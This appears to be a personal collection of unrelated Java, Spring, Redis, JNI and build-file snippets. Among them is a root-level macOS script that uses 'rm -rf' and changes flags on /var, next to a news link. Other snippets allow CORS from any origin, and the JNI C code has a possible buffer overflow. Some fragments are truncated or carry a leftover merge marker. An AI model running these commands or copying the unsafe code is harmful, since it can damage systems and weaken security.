                                <licenseFamilyName>Apache License 2.0</licenseFamilyName>
                                <notes/>
                                <patterns>
                                    <pattern>Licensed to the Apache Software Foundation (ASF) under one</pattern>
                                </patterns>
                            </license>
                            <license implementation="org.apache.rat.analysis.license.SimplePatternBasedLicense">
                                <licenseFamilyCategory>JQRY</licenseFamilyCategory>
                                <licenseFamilyName>MIT</licenseFamilyName>
                                <notes/>
                                <patterns>
                                    <pattern>Dual licensed under the MIT or GPL Version 2 licenses.</pattern>
                                </patterns>
                            </license>
                            <license implementation="org.apache.rat.analysis.license.SimplePatternBasedLicense">
                                <licenseFamilyCategory>JMOCK</licenseFamilyCategory>
                                <licenseFamilyName>JMock</licenseFamilyName>
                                <notes/>
                                <patterns>
                                    <pattern>Copyright (c) 2000-2007, jMock.org</pattern>
                                </patterns>
                            </license>
                            <license implementation="org.apache.rat.analysis.license.SimplePatternBasedLicense">
                                <licenseFamilyCategory>DOCBK</licenseFamilyCategory>
                                <licenseFamilyName>DocBook 4.5</licenseFamilyName>
                                <notes/>
                                <patterns>
                                    <pattern>Permission to copy in any form is granted for use</pattern>
                                    <pattern>Permission to use, copy, modify and distribute the DocBook DTD</pattern>
                                    <pattern>is hereby granted in perpetuity, provided that the above copyright</pattern>
                                    <pattern>This is the catalog data file for DocBook XML V4.5. It is provided as</pattern>
                                    <pattern>XML Catalog data for DocBook XML V4.5</pattern>
                                    <pattern>DocBook additional general entities V4.5</pattern>
                                    <pattern>XML EXCHANGE TABLE MODEL DECLARATION MODULE</pattern>
                                </patterns>
                            </license>
                            <license implementation="org.apache.rat.analysis.license.SimplePatternBasedLicense">
                                <licenseFamilyCategory>W3C</licenseFamilyCategory>
                                <licenseFamilyName>XHTML</licenseFamilyName>
                                <notes/>
                                <patterns>
                                    <pattern>Copyright (c) 1998-2002 W3C (MIT, INRIA, Keio),</pattern>
                                </patterns>
                            </license>
						</licenses>
						<licenseFamilies>
							<licenseFamily implementation="org.apache.rat.license.SimpleLicenseFamily">
								<familyName>Apache License 2.0</familyName>
							</licenseFamily>
							<licenseFamily implementation="org.apache.rat.license.SimpleLicenseFamily">
								<familyName>MIT</familyName>
							</licenseFamily>
							<licenseFamily implementation="org.apache.rat.license.SimpleLicenseFamily">
								<familyName>JMock</familyName>
							</licenseFamily>
							<licenseFamily implementation="org.apache.rat.license.SimpleLicenseFamily">
								<familyName>DocBook 4.5</familyName>
							</licenseFamily>
							<licenseFamily implementation="org.apache.rat.license.SimpleLicenseFamily">
								<familyName>XHTML</familyName>
							</licenseFamily>
						</licenseFamilies>
					</configuration>
				</plugin>
--------------------------------------------------------------------------------------------------------
				<plugin>
					<groupId>org.apache.maven.plugins</groupId>
					<artifactId>maven-antrun-plugin</artifactId>
					<version>1.7</version>
					<executions>
						<execution>
							<goals>
								<goal>run</goal>
							</goals>
						</execution>
					</executions>
				</plugin>
--------------------------------------------------------------------------------------------------------
        <plugin>
            <groupId>com.vaadin</groupId>
            <artifactId>vaadin-maven-plugin</artifactId>
            <version>8.4.5</version>
            <executions>
                <execution>
                    <goals>
                        <goal>update-theme</goal>
                        <goal>compile-theme</goal>
                        <!-- <goal>clean</goal> <goal>resources</goal> 
                            <goal>update-widgetset</goal> 
                            <goal>compile</goal> -->
                    </goals>
                </execution>
            </executions>
        </plugin>
--------------------------------------------------------------------------------------------------------
RedisCluster.builder()
                .sentinelPorts(redisSentinels) //btw, order counts here, if you set ports after setting replication groups
                .serverPorts(redisHosts) //you will get different ports. Go figure
                .withServerBuilder(new CustomClusterRedisServerBuilder().setting("maxmemory 128").setting("maxheap 128M")) //same goes for settings
                .withSentinelBuilder(RedisSentinel.builder().setting("maxmemory 128").setting("maxheap 128M"))
                .sentinelCount(3)
                .quorumSize(2)
                .replicationGroup("master1", 1)
                .replicationGroup("master2", 1)
                .replicationGroup("master3", 1)
                .build()
--------------------------------------------------------------------------------------------------------
final String authorization = httpRequest.getHeader("Authorization");
if (authorization != null && authorization.toLowerCase().startsWith("basic")) {
    // Authorization: Basic base64credentials
    String base64Credentials = authorization.substring("Basic".length()).trim();
    byte[] credDecoded = Base64.getDecoder().decode(base64Credentials);
    String credentials = new String(credDecoded, StandardCharsets.UTF_8);
    // credentials = username:password
    final String[] values = credentials.split(":", 2);
}
--------------------------------------------------------------------------------------------------------
Usage: ./redis-server [/path/to/redis.conf]
       ./redis-server - (read config from stdin)
       ./redis-server --test-memory <megabytes>
--------------------------------------------------------------------------------------------------------
mvn archetype:generate  \
    -D archetypeGroupId=org.apache.isis.archetype \
    -D archetypeArtifactId=simpleapp-archetype \
    -D archetypeVersion=2.0.0-M2 \
    -D groupId=com.mycompany \
    -D artifactId=myapp \
    -D version=1.0-SNAPSHOT \
    -B
--------------------------------------------------------------------------------------------------------
@Component
public class FactoryMethodComponent {

  private static int i;

  @Bean @Qualifier("public")
  public TestBean publicInstance() {
      return new TestBean("publicInstance");
  }

  // use of a custom qualifier and autowiring of method parameters

  @Bean @BeanAge(1)
  protected TestBean protectedInstance(@Qualifier("public") TestBean spouse,
                                       @Value("#{privateInstance.age}") String country) {
      TestBean tb = new TestBean("protectedInstance", 1);
      tb.setSpouse(tb);
      tb.setCountry(country);
      return tb;
  }

  @Bean @Scope(BeanDefinition.SCOPE_SINGLETON)
  private TestBean privateInstance() {
      return new TestBean("privateInstance", i++);
  }

  @Bean @Scope(value = WebApplicationContext.SCOPE_SESSION,
               proxyMode = ScopedProxyMode.TARGET_CLASS)
  public TestBean requestScopedInstance() {
      return new TestBean("requestScopedInstance", 3);
  }
}
--------------------------------------------------------------------------------------------------------
CREATE TABLE IF NOT EXISTS `articles` (
  `article_id` int(5) NOT NULL AUTO_INCREMENT,
  `title` varchar(200) NOT NULL,
  `category` varchar(100) NOT NULL,
  PRIMARY KEY (`article_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;

INSERT INTO `articles` (`article_id`, `title`, `category`) VALUES
	(1, 'Spring REST Security', 'Spring'),
	(2, 'Java Concurrency', 'Java'); 
--------------------------------------------------------------------------------------------------------

apply plugin: 'java'
apply plugin: 'eclipse'
apply plugin: 'war'
war.archiveName 'spring-app.war'

sourceCompatibility = 9

repositories {
    mavenCentral()
}
dependencies {
    compile 'org.springframework.boot:spring-boot-starter-web:2.0.4.RELEASE'
    compile 'org.springframework.boot:spring-boot-starter-data-jpa:2.0.4.RELEASE'    
    compile 'org.springframework.boot:spring-boot-starter-data-redis:2.0.4.RELEASE'
    compile 'mysql:mysql-connector-java:6.0.5'
    compile 'org.apache.commons:commons-dbcp2:2.1.1'
    compile 'javax.xml.bind:jaxb-api:2.3.0'
    providedRuntime 'org.springframework.boot:spring-boot-starter-tomcat:2.0.4.RELEASE'    
} 
--------------------------------------------------------------------------------------------------------
@Component("fooFormatter")
public class FooFormatter implements Formatter {
 
    public String format() {
        return "foo";
    }
}

@Component("barFormatter")
public class BarFormatter implements Formatter {
 
    public String format() {
        return "bar";
    }
}
	
public class FooService {
     
    @Autowired
    private Formatter formatter;
 
}
--------------------------------------------------------------------------------------------------------
const protobuf = require('protobufjs');

const testData = {
    name: 'Jack', 
    age: 12
};
...
// convert the object testData to protobuf

console.log(<the converted protobuf>)
--------------------------------------------------------------------------------------------------------
Map<String, Integer> map = 
    intList.stream().collect(toMap(i -> String.valueOf(i % 3), 
                                   i -> i, 
                                   Integer::sum));
								   
Map<String,Role> mappedRoles = Maps.uniqueIndex(yourList, new Function<Role,String>() {
  public String apply(Role from) {
    return from.getName(); // or something else
  }});
--------------------------------------------------------------------------------------------------------
public static <K, V> Map<K, V> listAsMap(Collection<V> sourceList, ListToMapConverter<K, V> converter) {
    Map<K, V> newMap = new HashMap<K, V>();
    for (V item : sourceList) {
        newMap.put( converter.getKey(item), item );
    }
    return newMap;
}

public static interface ListToMapConverter<K, V> {
    public K getKey(V item);
}
--------------------------------------------------------------------------------------------------------
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    ObjectOutputStream oos = new ObjectOutputStream(baos);


    oos.writeObject(obj);

    oos.flush();
    oos.close();

    InputStream is = new ByteArrayInputStream(baos.toByteArray());
--------------------------------------------------------------------------------------------------------
@ProtoClass(ProtoObject.class)
Class DomainClass{
  @ProtoField
  private String field1;
  @ProtoField(name = "xyz") // in case proto and domain class field have different names
  private String field2;
}
--------------------------------------------------------------------------------------------------------
{
  "name": "projectName",
  "version": "0.0.0",
  "description": "Blank Project for React.js",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "",
  "license": "ISC",
  "devDependencies": {
    "browserify": "^9.0.3",
    "gulp": "^3.8.11",
    "react": "^0.13.1",
    "reactify": "^1.1.0",
    "vinyl-source-stream": "^1.1.0"
  }
}

 
import org.ironjacamar.validator.rules.ao.AOConfigProperties;
import org.ironjacamar.validator.rules.ao.AOConstructor;
import org.ironjacamar.validator.rules.ao.AONull;
import org.ironjacamar.validator.rules.ao.AORAA;
import org.ironjacamar.validator.rules.as.AS;
import org.ironjacamar.validator.rules.as.ASConfigProperties;
import org.ironjacamar.validator.rules.as.ASConstructor;
import org.ironjacamar.validator.rules.as.ASNull;
import org.ironjacamar.validator.rules.cf.CFConstructor;
import org.ironjacamar.validator.rules.cf.CFNull;
import org.ironjacamar.validator.rules.cf.CFReferenceable;
import org.ironjacamar.validator.rules.cf.CFSerializable;
import org.ironjacamar.validator.rules.mc.MC;
import org.ironjacamar.validator.rules.mc.MCGetMetaData;
import org.ironjacamar.validator.rules.mcf.MCF;
import org.ironjacamar.validator.rules.mcf.MCFConfigProperties;
import org.ironjacamar.validator.rules.mcf.MCFConstructor;
import org.ironjacamar.validator.rules.mcf.MCFEquals;
import org.ironjacamar.validator.rules.mcf.MCFHashCode;
import org.ironjacamar.validator.rules.mcf.MCFNull;
import org.ironjacamar.validator.rules.ra.RA;
import org.ironjacamar.validator.rules.ra.RAConfigProperties;
import org.ironjacamar.validator.rules.ra.RAConstructor;
import org.ironjacamar.validator.rules.ra.RAEquals;
import org.ironjacamar.validator.rules.ra.RAHashCode;
import org.ironjacamar.validator.rules.ra.RANull;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedList;
import java.util.List;
import java.util.Locale;
import java.util.ResourceBundle;

/**
 * Validator
 */
public class Validator
{
   /**
    * The fully qualified class name of the rules
    * as we may want to externalize them into a
    * properties file
    */
   private static final Rule[] CLASS_RULES = {
      new MCFNull(),
      new MCF(),
      new MCFConstructor(),
      new MCFHashCode(),
      new MCFEquals(),
      new MCFConfigProperties(),
      new MC(),
      new MCGetMetaData(),
      new RANull(),
      new RA(),
      new RAConstructor(),
      new RAHashCode(),
      new RAEquals(),
      new RAConfigProperties(),
      new CFConstructor(),
      new CFNull(),
      new CFSerializable(),
      new CFReferenceable(),
      new ASNull(),
      new AS(),
      new ASConstructor(),
      new ASConfigProperties(),
      new AONull(),
      new AOConstructor(),
      new AOConfigProperties(),
      new AORAA()
   };

   private static final Rule[] OBJECT_RULES = {
      new MCGetMetaData(),
   };

   private static Rule[] allRules;
   static
   {
      List<Rule> arrayList = new ArrayList<>();
      arrayList.addAll(Arrays.asList(CLASS_RULES));
      arrayList.addAll(Arrays.asList(OBJECT_RULES));
      allRules = arrayList.toArray(new Rule[CLASS_RULES.length + OBJECT_RULES.length]);
   };

   /**
    * Constructor
    */
   public Validator()
   {
   }

   /**
    * Get the resource bundle
    * @return The resource bundle
    */
   public ResourceBundle getResourceBundle()
   {
      return ResourceBundle.getBundle("validator", Locale.US,
                                      SecurityActions.getClassLoader(Validator.class));
   }

   /**
    * Validate
    *
    * @param objects Objects that should be validated
    * @return The list of failures; <code>null</code> if no errors
    */
   public List<Failure> validate(List<Validate> objects)
   {
      if (objects == null || objects.isEmpty())
         return null;

      return execRulesOnValidates(objects);
   }

   /**
    * exec rules
    * @param objects to be validated
    * @return The list of failures; an Empty list if no errors
    */
   private List<Failure> execRulesOnValidates(List<Validate> objects)
   {
      ResourceBundle resourceBundle = getResourceBundle();

      List<Failure> result = null;

      for (Rule rule : allRules)
      {
         for (Validate obj : objects)
         {
            List<Failure> failures = rule.validate(obj, resourceBundle);

            if (failures != null)
            {
               if (result == null)
               {
                  result = new LinkedList<>();
               }
               result.addAll(failures);
            }
         }
      }

      return result;
   }
}
--------------------------------------------------------------------------------------------------------

import org.jboss.logging.BasicLogger;
import org.jboss.logging.annotations.Cause;
import org.jboss.logging.annotations.LogMessage;
import org.jboss.logging.annotations.Message;
import org.jboss.logging.annotations.MessageLogger;

import static org.jboss.logging.Logger.Level.INFO;
import static org.jboss.logging.Logger.Level.WARN;

/**
 * The deployers logger.
 *
 * Message ids ranging from 020000 to 029999 inclusively.
 */
@MessageLogger(projectCode = "IJ2")
public interface DeployersLogger extends BasicLogger
{
   // ABSTRACT RESOURCE ADAPTER DEPLOYER

   /**
    * Required license terms
    * @param url The license url
    */
   @LogMessage(level = INFO)
   @Message(id = 20001, value = "Required license terms for %s")
   public void requiredLicenseTerms(String url);

   /**
    * Deployed
    * @param archiveName The archive name
    */
   @LogMessage(level = INFO)
   @Message(id = 20002, value = "Deployed: %s")
   public void deployed(String archiveName);

   /**
    * Changed TransactionSupport
    * @param jndiName The JNDI name
    */
   @LogMessage(level = INFO)
   @Message(id = 20003, value = "Changed TransactionSupport for %s")
   public void changedTransactionSupport(String jndiName);

   /**
    * Validation report failure
    * @param detail The details
    * @param t The exception
    */
   @LogMessage(level = WARN)
   @Message(id = 20004, value = "Failure during validation report generation: %s")
   public void validationReportFailure(String detail, @Cause Throwable t);

   /**
    * Invalid archive
    * @param archive The archive
    */
   @LogMessage(level = WARN)
   @Message(id = 2005, value = "Invalid archive: %s")
   public void validationInvalidArchive(String archive);
}
--------------------------------------------------------------------------------------------------------
#include <jni.h>
#include <string.h>
#include <stdlib.h>
#include "build/c/HelloWorld.h"

/*
 * Class:     org_ironjacamar_samples_helloworld_HelloWorldManagedConnection
 * Method:    helloWorld
 * Signature: (Ljava/lang/String;)Ljava/lang/String;
 */
JNIEXPORT jstring JNICALL 
Java_org_ironjacamar_samples_helloworld_HelloWorldManagedConnection_helloWorld(JNIEnv *env, jobject o, jstring s)
{
   int length = 0;

   if (s != NULL)
      length = (*env)->GetStringLength(env, s);

   char *buf = (char*)malloc(16 + length);

   strcpy(buf, "Hello World, ");

   if (s != NULL)
      strcat(buf, (*env)->GetStringUTFChars(env, s, 0));

   strcat(buf, " !");

   jstring result = (*env)->NewStringUTF(env, buf);

   free(buf);

   return result;
}
--------------------------------------------------------------------------------------------------------
PROJECT(helloworld-native)

CMAKE_MINIMUM_REQUIRED (VERSION 2.8)
SET(CMAKE_VERBOSE_MAKEFILE 1)

SET(LIBRARY_OUTPUT_PATH build)
SET(BUILD_SHARED_LIBS ON)
SET(CMAKE_INCLUDE_CURRENT_DIR ON)

FIND_PACKAGE(Java)
FIND_PACKAGE(JNI)

INCLUDE_DIRECTORIES(${JAVA_INCLUDE_PATH})
INCLUDE_DIRECTORIES(${JAVA_INCLUDE_PATH2})

ADD_LIBRARY(HelloWorld helloworld.c)
--------------------------------------------------------------------------------------------------------
# Additional logger names to configure (root logger is always configured)
loggers=org.ironjacamar,org.jboss,org.jnp,com.arjuna

# Root logger level
logger.level=INFO
logger.handlers=CONSOLE, FILE

# org.ironjacamar
logger.org.ironjacamar.level=TRACE

# org.jgroups
logger.org.jgroups.level=TRACE

# org.jboss
logger.org.jboss.level=INFO

# org.jnp
logger.org.jnp.level=INFO

# com.arjuna
logger.com.arjuna.level=INFO

# Console handler configuration
handler.CONSOLE=org.jboss.logmanager.handlers.ConsoleHandler
handler.CONSOLE.properties=autoFlush
handler.CONSOLE.level=WARN
handler.CONSOLE.autoFlush=true
handler.CONSOLE.formatter=PATTERN

# File handler configuration
handler.FILE=org.jboss.logmanager.handlers.FileHandler
handler.FILE.level=TRACE
handler.FILE.properties=autoFlush,fileName
handler.FILE.autoFlush=true
handler.FILE.fileName=build/test.log
handler.FILE.formatter=PATTERN

# Formatter pattern configuration
formatter.PATTERN=org.jboss.logmanager.formatters.PatternFormatter
formatter.PATTERN.properties=pattern
formatter.PATTERN.pattern=%d{HH:mm:ss,SSS} %-5p [%c{1}] %m%n
--------------------------------------------------------------------------------------------------------
lexer grammar SelectHtmlLexer;


K_SELECT    :   S E L E C T ;
K_FROM      :   F R O M ;
K_WHERE     :   W H E R E ;

K_ATTR      :   (A T T R | A T T R I B U T E) ;
K_ATTRS     :   (A T T R S | A T T R I B U T E S) ;
K_TEXT      :   T E X T ;
K_HTML      :   H T M L ;
K_TAG       :   T A G ;
K_ID        :   I D ;
K_CLASS     :   C L A S S ;
K_CLASSES   :   C L A S S E S;

K_OR        :   O R ;
K_AND       :   A N D ;
K_START     :   S T A R T ;
K_END       :   E N D ;
K_CONTAINS  :   C O N T A I N S ;
K_REGEX     :   R E G E X ;

K_NEXT      :   N E X T ;
K_SIBLING   :   S I B L I N G ;
K_SIBLINGS  :   S I B L I N G S ;
K_DESCENDANT:   D E S C E N D A N T  ;
K_PARENT    :   P A R E N T ;
K_CHILD     :   C H I L D ;

K_OF        :   O F ;
K_WITH      :   W I T H ;

EQUAL       :   '=' ;
ALL         :   '*' ;
OPEN_P      :   '(' ;
CLOSE_P     :   ')' ;

STRING      :    '\'' ('\\'. | '\'\'' | ~('\'' | '\\'))* '\'' ;

LINE_COMMENT    : '//' .*? '\r'? '\n'  -> skip ;
WS              : [ \t\r\n]+ -> skip ;

fragment DIGIT  : [0-9];
fragment LETTER : ('a'..'z'|'A'..'Z');
fragment A      : [aA];
fragment B      : [bB];
fragment C      : [cC];
fragment D      : [dD];
fragment E      : [eE];
fragment F      : [fF];
fragment G      : [gG];
fragment H      : [hH];
fragment I      : [iI];
fragment J      : [jJ];
fragment K      : [kK];
fragment L      : [lL];
fragment M      : [mM];
fragment N      : [nN];
fragment O      : [oO];
fragment P      : [pP];
fragment Q      : [qQ];
fragment R      : [rR];
fragment S      : [sS];
fragment T      : [tT];
fragment U      : [uU];
fragment V      : [vV];
fragment W      : [wW];
fragment X      : [xX];
fragment Y      : [yY];
fragment Z      : [zZ];
fragment SPACE  : ' ';
--------------------------------------------------------------------------------------------------------
@ComponentScan(basePackages = {"xxx.xxx.xxx"})
@Configuration
@EnableAspectJAutoProxy
@Import({
        SwaggerConfiguration.class
})
@EnableWebMvc
public class WebConfig extends WebMvcConfigurerAdapter {

    private static final Logger logger = LoggerFactory.getLogger(WebConfig.class);

    private static final int CACHE_PERIOD = 3600; // one year

    @Autowired
    private RequestMappingHandlerAdapter requestMappingHandlerAdapter;



    @Inject
    private Environment env;

    public WebConfig() {
        super();
    }

    @PostConstruct
    public void init() {
        requestMappingHandlerAdapter.setIgnoreDefaultModelOnRedirect(true);
    }


    @Override
    public void configureDefaultServletHandling(DefaultServletHandlerConfigurer configurer) {
        if(env.getActiveProfiles().length > 0)
            logger.info("Web application  configuration , using profile {} ", Arrays.toString(env.getActiveProfiles()));

        //configurer.enable();
    }

    @Override
    public void extendMessageConverters(List<HttpMessageConverter<?>> converters) {
        ObjectMapper objectMapper = null;
        for (HttpMessageConverter converter : converters) {
            if (converter instanceof MappingJackson2HttpMessageConverter) {
                MappingJackson2HttpMessageConverter jacksonConverter =
                        ((MappingJackson2HttpMessageConverter) converter);

                if (objectMapper == null) {
                    objectMapper = jacksonConverter.getObjectMapper();
                } else {
                    jacksonConverter.setObjectMapper(objectMapper);
                }
            }
        }
    }



    @Profile(ProfileConsts.GNG_DEV)
    @Override
    public void addResourceHandlers(ResourceHandlerRegistry registry) {

        logger.debug("Registering swagger ui path begun");

        registry
                .addResourceHandler("swagger-ui.html")
                .addResourceLocations("classpath:/META-INF/resources/swagger-ui.html")
                .setCachePeriod(CACHE_PERIOD)
                .resourceChain(true)
                .addResolver(new GzipResourceResolver())
                .addResolver(new PathResourceResolver());

        registry
                .addResourceHandler("/webjars/** ")
                .addResourceLocations("classpath:/META-INF/resources/webjars/")
                .setCachePeriod(CACHE_PERIOD)
                .resourceChain(true)
                .addResolver(new GzipResourceResolver())
                .addResolver(new PathResourceResolver());

        logger.debug("Swagger ui path registered successfully !! ");

    }

    @Override
    public void configureMessageConverters(List<HttpMessageConverter<?>> converters) {
        super.configureMessageConverters(converters);
    }

    @Override
    public void configureContentNegotiation(ContentNegotiationConfigurer configurer) {

        logger.debug("Registering content negotiation configurer started ...");


        configurer.favorPathExtension(false)
                .favorParameter(true)
                .parameterName("mediaType")
                .ignoreAcceptHeader(true)
                .useJaf(false)
                .defaultContentType(MediaType.APPLICATION_JSON)
                .mediaType("xml", MediaType.APPLICATION_XML)
                .mediaType("json", MediaType.APPLICATION_JSON);

        logger.debug("Registering content negotiation configurer completed");
    }

    @Bean
    public ViewResolver internalResourceViewResolver() {
        logger.debug("Registering view resolver started ...");

        InternalResourceViewResolver viewResolver = new InternalResourceViewResolver();
        viewResolver.setViewClass(JstlView.class);
        viewResolver.setPrefix("/WEB-INF/views/jsp/");
        viewResolver.setSuffix(".jsp");

        logger.debug("Registering view resolver completed successfully  ...");

        return viewResolver;
    }

    @Bean
    public CommonsMultipartResolver multipartResolver() {
        logger.debug("Registering multipart resolver started ...");

        CommonsMultipartResolver commonsMultipartResolver = new CommonsMultipartResolver();
        commonsMultipartResolver.setMaxInMemorySize(1048576);
        commonsMultipartResolver.setMaxUploadSize(52428800);

        logger.debug("Registering multipart resolver completed successfully !!");

        return commonsMultipartResolver;
    }

    @Override
    public org.springframework.validation.Validator getValidator() {
        return new LocalValidatorFactoryBean();
    }

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        logger.debug("Registering interceptor started ...");

        registry.addInterceptor(new LocaleChangeInterceptor());
        registry.addInterceptor(interceptor()).addPathPatterns("/**");

        logger.debug("Registering interceptor completed successfully !!");

    }

    @Bean
    public TokenAuthInterceptor interceptor() {
        return new TokenAuthInterceptor();
    }

    @Override
    public void addCorsMappings(CorsRegistry registry) {

        logger.debug("Registration of cors started ... ");

        registry
                .addMapping("/** ")
                .allowedMethods("GET", "POST", "PUT", "DELETE", "OPTIONS")
                .allowCredentials(false)
                .allowedHeaders("Content-Type,X-Requested-With,accept,Origin,Access-Control-Request-Method,Access-Control-Request-Headers,token-key,username,password")
                .maxAge(1);

        logger.debug("Registration of cors completed successfully !! ");

    }

    @Override
    public void configureHandlerExceptionResolvers(List<HandlerExceptionResolver> exceptionResolvers) {
        exceptionResolvers.add(exceptionHandlerExceptionResolver());
        exceptionResolvers.add(restExceptionResolver());
    }

    @Bean
    public ExceptionHandlerExceptionResolver exceptionHandlerExceptionResolver() {

        logger.info("Registering of rest exception handling started ...");

        ExceptionHandlerExceptionResolver resolver = new ExceptionHandlerExceptionResolver();

        resolver.setMessageConverters(HttpMessageConverterUtils.getDefaultHttpMessageConverters());

        logger.debug("Registration of rest exception handling completed successfully !! ");

        return resolver;
    }

    @Bean
    public RestHandlerExceptionResolver restExceptionResolver() {
        return RestHandlerExceptionResolver
                .builder()
                .messageSource(httpErrorMessageSource())
                .defaultContentType(MediaType.APPLICATION_JSON)
                .addErrorMessageHandler(EmptyResultDataAccessException.class, org.springframework.http.HttpStatus.NOT_FOUND)
                .build();
    }

    @Bean
    public MessageSource httpErrorMessageSource() {
        ReloadableResourceBundleMessageSource m = new ReloadableResourceBundleMessageSource();
        m.setBasename("classpath:/org/example/messages");
        m.setDefaultEncoding("UTF-8");
        return m;
    }

    @Override
    public void addFormatters(FormatterRegistry registry) {

        logger.debug("Registration of formatter started ...");

        logger.info("Setting date time formatter ");

        DateTimeFormatterRegistrar registrar = new DateTimeFormatterRegistrar();

        registrar.setUseIsoFormat(true);

        registrar.registerFormatters(registry);

        logger.debug("Registration of formatter completed successfully ...");
    }

}
--------------------------------------------------------------------------------------------------------
@ApiImplicitParam(name = "Authorization", value = "Access Token", required = true, allowEmptyValue = false, paramType = "header", dataTypeClass = String::class, example = "Bearer access_token")
fun addJob(jobRequest: Job): ResponseEntity<*>{}
--------------------------------------------------------------------------------------------------------@Bean
public Docket postsApi() {

    //Adding Header
    ParameterBuilder aParameterBuilder = new ParameterBuilder();
    List<Parameter> aParameters = new ArrayList<Parameter>();

    aParameters.clear();

    aParameterBuilder.name("myHeaderParam0").modelRef(new ModelRef("string")).parameterType("header").required(false).build();
    aParameters.add(aParameterBuilder.build());
    aParameterBuilder.name("myHeaderParam1").modelRef(new ModelRef("string")).parameterType("header").required(false).build();
    aParameters.add(aParameterBuilder.build());
   ....
   ....

    return new Docket(DocumentationType.SWAGGER_2).groupName("public-api")
            .apiInfo(apiInfo()).select().paths(postPaths()).build().ignoredParameterTypes(HeaderVo.class).globalOperationParameters(aParameters);

<<<<<<< HEAD
final class ConcreteChild1 extends ParentBase implements Child1
{}
--------------------------------------------------------------------------------------------------------
@Target({
  ElementType.FIELD, 
  ElementType.METHOD,
  ElementType.TYPE, 
  ElementType.PARAMETER})
@Retention(RetentionPolicy.RUNTIME)
@Qualifier
public @interface CarQualifier {
}
--------------------------------------------------------------------------------------------------------
@CrossOrigin(origins = "*", allowedHeaders = "*")
--------------------------------------------------------------------------------------------------------
@Configuration
@EnableWebMvc
public class CorsConfiguration extends WebMvcConfigurerAdapter
{
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/**")
                .allowedMethods("GET", "POST");
    }
}

@Configuration
public class CorsConfiguration
{
    @Bean
    public WebMvcConfigurer corsConfigurer()
    {
        return new WebMvcConfigurerAdapter() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping("/**");
            }
        };
    }
}
--------------------------------------------------------------------------------------------------------
chroot /Volumes/Macintosh\ HD # "Macintosh HD" is the default

rm -rf /Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle

mv var var_back # var may not exist, but this is fine

ln -sh private/var var

chflags -h restricted /var

chflags -h hidden /var

xattr -sw com.apple.rootless "" /var

Подробнее: https://www.securitylab.ru/news/501385.php
--------------------------------------------------------------------------------------------------------

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Set;

import org.springframework.boot.autoconfigure.data.redis.RedisProperties;
import org.springframework.data.redis.connection.RedisConnectionFactory;
import org.springframework.util.CollectionUtils;
import org.springframework.util.StringUtils;

import io.cereebro.core.Component;
import io.cereebro.core.ComponentType;
import io.cereebro.core.Dependency;
import io.cereebro.core.Relationship;
import io.cereebro.core.RelationshipDetector;
import lombok.Getter;
import lombok.Setter;

/**
 * Redis RelationshipDetector. Aside from a Redis sentinel master, nothing
 * carries a name in Redis, therefore for a basic connection we can only detect
 * a relationship to a typed Redis component with a default name.
 * 
 * @author michaeltecourt
 *
 */
public class RedisRelationshipDetector implements RelationshipDetector {

    @Getter
    @Setter
    private String defaultName = "default";

    private final RedisProperties redisProperties;
    private final List<RedisConnectionFactory> connectionFactories;

    /**
     * Redis RelationshipDetector.
     * 
     * @param redisProperties
     *            Redis configuration properties (nullable).
     * @param redisConnectionFactories
     *            Available RedisConnectionFactory instances (nullable).
     */
    public RedisRelationshipDetector(RedisProperties redisProperties,
            List<RedisConnectionFactory> redisConnectionFactories) {
        this.redisProperties = redisProperties;
        this.connectionFactories = new ArrayList<>();
        if (!CollectionUtils.isEmpty(redisConnectionFactories)) {
            this.connectionFactories.addAll(redisConnectionFactories);
        }
    }

    @Override
    public Set<Relationship> detect() {
        if (CollectionUtils.isEmpty(connectionFactories)) {
            return Collections.emptySet();
        }
        String sentinelMaster = getRedisSentinelMasterName();
        String name = StringUtils.hasText(sentinelMaster) ? sentinelMaster : defaultName;
        return Dependency.on(Component.of(name, ComponentType.REDIS)).asRelationshipSet();
    }

    /**
     * Returns the name of the Redis Sentinel master, extracted from
     * configuration properties.
     * 
     * @return Nullable Redis Sentinel master name.
     */
    private String getRedisSentinelMasterName() {
        if (redisProperties != null && redisProperties.getSentinel() != null) {
            return redisProperties.getSentinel().getMaster();
        }
        return null;
    }
}
--------------------------------------------------------------------------------------------------------
exclude org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration
and set: spring.data.redis.repositories.enabled=false
--------------------------------------------------------------------------------------------------------
import com.springboot.redis.domains.Insurance;
import com.springboot.redis.repositories.InsuranceRepository;
import org.springframework.cache.annotation.CacheEvict;
import org.springframework.cache.annotation.CachePut;
import org.springframework.cache.annotation.Cacheable;
import org.springframework.context.annotation.Description;
import org.springframework.stereotype.Service;

import javax.persistence.EntityManager;
import javax.persistence.PersistenceContext;
import java.util.List;

@Description(value = "Insurance service responsible for processing data.")
@Service
public class InsuranceService {

    private InsuranceRepository insuranceRepository;

    @PersistenceContext
    private EntityManager entityManager;


    /**
     * Constructor dependency injector.
     * @param insuranceRepository - insurance repository layer.
     */
    public InsuranceService(InsuranceRepository insuranceRepository) {
        this.insuranceRepository = insuranceRepository;
    }

    /**
     * Method for getting all insurances
     *
     * @param county - provided county name
     * @return List of insurances / cacheable values
     */
    @Cacheable(value = "insurances", key = "#county")
    public List<Insurance> findAllInsurancesByCounty(String county) {
        return insuranceRepository.findByCounty(county);
    }

    /**
     * Method for getting insurance by identifier
     *
     * @param id - insurance identifier
     * @return Insurance / cacheable value
     */
    @Cacheable(value = "insurance", key = "#id")
    public Insurance findOneById(Integer id) {
        return insuranceRepository.findOne(id);
    }

    /**
     * Method for storing new insurance and caching it in redis
     *
     * @param insurance - insurance payload
     * @return stored Insurance
     */
    @CachePut(value = "insurance", key = "#insurance.id")
    public Insurance store(Insurance insurance) {
        return insuranceRepository.save(insurance);
    }

    /**
     * Method for destroying insurance by identifier and remove it from redis
     *
     * @param id - insurance identifier
     */
    @CacheEvict(value = "insurance", key = "#id")
    public void destroy(Integer id) {
        insuranceRepository.delete(id);
    }
}
--------------------------------------------------------------------------------------------------------
